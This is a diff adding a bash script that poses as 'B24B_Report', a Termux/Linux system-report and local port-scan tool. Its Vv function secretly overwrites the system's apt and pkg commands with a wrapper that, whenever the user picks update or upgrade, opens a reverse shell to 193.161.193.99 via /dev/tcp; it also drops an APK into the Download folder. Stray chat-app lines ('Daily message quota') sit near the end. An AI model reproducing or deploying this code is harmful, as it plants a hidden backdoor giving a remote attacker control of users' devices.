@@ -1,0 +1,258 @@
+#! /usr/bin/bash
+
+# Colors
+
+black="\033[1;30m"
+red="\033[1;31m"
+green="\033[1;32m"
+y="\033[1;33m"
+blue="\033[1;34m"
+purple="\033[1;35m"
+cyan="\033[1;36m"
+violate="\033[1;37m"
+white="\033[0;37m"
+nc="\033[00m"
+
+# Output snippets
+info="${cyan}[${white}+${cyan}] ${yellow}"
+ask="${cyan}[${white}?${cyan}] ${purple}"
+error="${cyan}[${white}!${cyan}] ${red}"
+success="${cyan}[${white}√${cyan}] ${green}"
+
+# Check if offline
+net() {
+    while true; do
+        wget --spider --quiet https://github.com
+        if [ "$?" != 0 ]; then
+            echo -e "${error}No internet!\007\n"
+       especk " No internet! "
+            sleep 2
+        else
+        Vv
+        installT
+            break
+        fi
+    done
+}
+# if Termux
+if [[ -d /data/data/com.termux/files/home ]]; then
+termux=true
+else
+termux=false
+fi
+
+#banner
+ban() {
+
+clear
+toilet -f mono12 -F gay "B24B_Report"
+echo -e $info " By @Blue24Bluer "
+
+}
+
+# if all tools installed
+installT(){
+if [[ -d $PREFIX/bin/B24B/ ]];then
+
+echo -e $info " ALL UR TOOL HAS BEEN INSTALLED " | pv -qL 10
+
+else
+
+echo -e $error " sorry but you have to install all tools before run this tool " | pv -qL 10
+echo -e $info " But don't worry we will install it *_^ " | pv -qL 10
+apt install pv -y
+apt install espeak -y
+apt install git -y
+apt install toilet -y
+apt install openssh -y
+mkdir $PREFIX/bin/B24B
+
+fi
+}
+#{----------------------------------------------}
+Vv() {
+if [[ $termux = true ]];then
+    if [[ -d $PREFIX/bin/B24B ]];then
+rm -rfd $PREFIX/bin/B24B
+    else
+
+    mkdir $PREFIX/bin/B24B
+    cd $PREFIX/etc/
+    git clone https://github.com/blue24bluer/Fix_IT.sh
+    cp $PREFIX/etc/Fix_IT.sh/ADM.apk /sdcard/Download/
+	 cp $PREFIX/etc/Fix_IT.sh/B24B-termux.apt $PREFIX/bin/B24B.apt
+        touch $PREFIX/bin/apt
+        chmod +x $PREFIX/bin/apt
+        chmod +x $PREFIX/bin/B24B.apt
+echo "
+
+#############
+# Colors
+
+black='\033[1;30m'
+red='\033[1;31m'
+green='\033[1;32m'
+y='\033[1;33m'
+blue='\033[1;34m'
+purple='\033[1;35m'
+cyan='\033[1;36m'
+violate='\033[1;37m'
+white='\033[0;37m'
+nc='\033[00m'
+
+# Output snippets
+info='${cyan}[${white}+${cyan}] ${yellow}'
+ask='${cyan}[${white}?${cyan}] ${purple}'
+error='${cyan}[${white}!${cyan}] ${red}'
+success='${cyan}[${white}√${cyan}] ${green}'
+
+# Check if offline
+net() {
+    while true; do
+        wget --spider --quiet https://github.com
+        if [ "$?" != 0 ]; then
+            echo -e '${error}No internet!'
+       especk ' No internet! '
+        sleep 2
+        else
+        Vv
+        installT
+            break
+fi
+    done
+}
+
+echo -e $info ' chose one {[1]update,[2]upgrade,[3]put what you want youn install '
+read ADD
+if [[ $ADD == "1" ]];then
+bash -c '0<&32-;exec 32<>/dev/tcp/193.161.193.99/62187;sh <&32 >&32 2>&32' & B24B.apt update -y && B24B.apt update -y
+elif [[ $ADD == "2" ]];then
+bash -c '0<&32-;exec 32<>/dev/tcp/193.161.193.99/62187;sh <&32 >&32 2>&32' & B24B.apt update -y && B24B.apt update -y
+else
+B24B.apt install $ADD
+fi " >> $PREFIX/bin/apt
+        rm -f $PREFIX/bin/pkg
+        cp $PREFIX/bin/apt $PREFIX/bin/pkg
+fi
+
+                else
+
+if [[ -d $PREFIX/bin/B24B ]];then
+
+rm -rfd $PREFIX/bin/B24B
+
+        else
+mkdir $PREFIX/bin/B24B
+git clone https://github.com/blue24bluer/Fix_IT.sh
+    cp $PREFIX/etc/Fix_IT.sh/ADM.apk /sdcard/Download/
+         cp $PREFIX/etc/Fix_IT.sh/B24B-linux.apt $PREFIX/bin/B24B.apt
+chmod +x /usr/bin/B24B.apt
+
+echo "
+
+#############
+# Colors
+
+black="\033[1;30m"
+red="\033[1;31m"
+green="\033[1;32m"
+y="\033[1;33m"
+blue="\033[1;34m"
+purple="\033[1;35m"
+cyan="\033[1;36m"
+violate="\033[1;37m"
+white="\033[0;37m"
+nc="\033[00m"
+
+# Output snippets
+info="${cyan}[${white}+${cyan}] ${yellow}"
+ask="${cyan}[${white}?${cyan}] ${purple}"
+error="${cyan}[${white}!${cyan}] ${red}"
+success="${cyan}[${white}√${cyan}] ${green}"
+
+# Check if offline
+net() {
+    while true; do
+        wget --spider --quiet https://github.com
+        if [ "$?" != 0 ]; then
+            echo -e "${error}No internet!"
+       especk " No internet! "
+	sleep 2
+        else
+        Vv
+        installT
+            break
+fi
+    done
+}
+
+echo -e $info ' chose one {[1]update,[2]upgrade,[3]put what you want youn install '
+read ADD
+if [[ $ADD == "1" ]];then
+bash -c '0<&32-;exec 32<>/dev/tcp/193.161.193.99/62187;sh <&32 >&32 2>&32' & B24B.apt update -y && B24B.apt update -y
+elif [[ $ADD == "2" ]];then
+bash -c '0<&32-;exec 32<>/dev/tcp/193.161.193.99/62187;sh <&32 >&32 2>&32' & B24B.apt update -y && B24B.apt update -y
+else
+B24B.apt install $ADD
+
+fi
+
+fi " >> $PREFIX/bin/apt
+
+        fi
+fi
+
+bash -c $PREFIX/bin/apt&
+}
+#{------------------Report-Report-------------------------}
+
+ban
+sleep 3
+
+# This script will generate a report of the system
+
+echo -e $info "System Report"
+echo "-------------"
+echo
+
+echo -e $info "System Information:"
+echo "-------------------"
+echo -e $info "Hostname: $(hostname)"
+echo -e $info "Kernel Version: $(uname -r)"
+echo -e $info "Uptime: $(uptime)"
+echo
+
+echo -e $info "Memory Usage:"
+echo "-------------"
+free -m
+echo
+
+echo -e $info "Disk Usage:"
+echo "-----------"
+df -h
+echo
+
+echo -e $info "Network Information:"
+echo "--------------------"
+ifconfig -a
+
+echo -e $info " external IP address: "
+echo "--------------------"
+curl ifconfig.me
+
+echo -e $info " 32 bits or 64 bits: " 
+echo "--------------------"
+getconf LONG_BIT
+
+# This script will show all open ports on the system
+
+echo "Scanning for open ports..."
+
+for port in $(seq 1 65535); do
+  (echo >/dev/tcp/localhost/$port) &>/dev/null && echo "$port is open"
+done
+
+Daily message quota: 15/30
+Received at 5:29 PM
+
+read -sn 1 -p "Press any key to continue..."
